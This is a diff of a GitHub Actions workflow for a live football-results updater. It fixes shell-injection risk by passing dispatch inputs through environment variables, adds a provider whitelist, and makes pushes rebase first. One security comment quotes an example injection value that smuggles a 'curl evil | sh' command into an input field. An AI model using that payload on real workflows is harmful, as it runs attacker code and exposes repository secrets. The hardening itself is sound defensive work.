@@ -71,18 +71,26 @@ jobs:
 
       - name: Resolve provider for this run
         id: provider
+        # SECURITY: github.event.inputs.* values are passed through `env:` not
+        # interpolated into the shell script. Direct interpolation would let
+        # anyone with write access to the repo run arbitrary code on the runner
+        # (and therefore access API_FOOTBALL_KEY, VERCEL_TOKEN, etc.) by
+        # dispatching with a value like `mock"; curl evil | sh; #`.
+        env:
+          INPUT_PROVIDER: ${{ github.event.inputs.provider }}
+          VAR_FOOTBALL_PROVIDER: ${{ vars.FOOTBALL_PROVIDER }}
+          VAR_WC_RESULTS_SOURCE: ${{ vars.WC_RESULTS_SOURCE }}
         run: |
-          PROVIDER="${{ github.event.inputs.provider }}"
-          if [ -z "$PROVIDER" ]; then
-            PROVIDER="${{ vars.FOOTBALL_PROVIDER }}"
-          fi
-          if [ -z "$PROVIDER" ]; then
-            PROVIDER="${{ vars.WC_RESULTS_SOURCE }}"
-          fi
-          if [ -z "$PROVIDER" ]; then
-            PROVIDER="mock"
-          fi
-          echo "provider=$PROVIDER" >> $GITHUB_OUTPUT
+          PROVIDER="$INPUT_PROVIDER"
+          if [ -z "$PROVIDER" ]; then PROVIDER="$VAR_FOOTBALL_PROVIDER"; fi
+          if [ -z "$PROVIDER" ]; then PROVIDER="$VAR_WC_RESULTS_SOURCE"; fi
+          if [ -z "$PROVIDER" ]; then PROVIDER="mock"; fi
+          # Defensive whitelist — only known providers allowed downstream.
+          case "$PROVIDER" in
+            mock|api_football|football_data|sportmonks) : ;;
+            *) echo "Refusing unknown provider: $PROVIDER" >&2; exit 1 ;;
+          esac
+          echo "provider=$PROVIDER" >> "$GITHUB_OUTPUT"
           echo "Provider for this run: $PROVIDER"
 
       - name: Rebuild fixture map if provider changed
@@ -130,8 +138,11 @@ jobs:
           API_FOOTBALL_LEAGUE_ID: ${{ vars.API_FOOTBALL_LEAGUE_ID }}
           API_FOOTBALL_SEASON: ${{ vars.API_FOOTBALL_SEASON }}
           FOOTBALL_DATA_COMPETITION: ${{ vars.FOOTBALL_DATA_COMPETITION }}
+        # SECURITY: same env-var hardening as the resolve-provider step.
+        env:
+          INPUT_DRY_RUN: ${{ github.event.inputs.dry_run }}
         run: |
-          if [ "${{ github.event.inputs.dry_run }}" = "true" ]; then
+          if [ "$INPUT_DRY_RUN" = "true" ]; then
             python scripts/live/run_live_update.py --dry-run
           else
             python scripts/live/run_live_update.py
@@ -139,6 +150,8 @@ jobs:
 
       - name: Commit updated JSON (if changed)
         if: steps.gate.outputs.skip != 'true' && github.event.inputs.dry_run != 'true'
+        env:
+          INPUT_DRY_RUN: ${{ github.event.inputs.dry_run }}
         run: |
           set +e   # never let a non-zero exit here fail the whole tick
           git config user.name "wc26-bot"
@@ -161,6 +174,13 @@ jobs:
           # other workflow (daily-baseline.yml) is schedule-only, so there's
           # nothing here for `[skip ci]` to usefully skip.
           git commit -m "live: update results @ $(date -u +%Y-%m-%dT%H:%MZ)"
+          # PUSH-RACE FIX: a manual dispatch firing during a scheduled cron
+          # tick (or vice versa) can land out of order. Rebase the staged
+          # commit on top of any new origin/main commits before pushing so
+          # the second pusher doesn't 403 with non-fast-forward and silently
+          # drop its update. --autostash unnecessary here — we have a clean
+          # tree post-commit.
+          git pull --rebase origin main || echo "Rebase failed — pushing anyway."
           git push || echo "Push failed — will retry next tick."
           exit 0
 
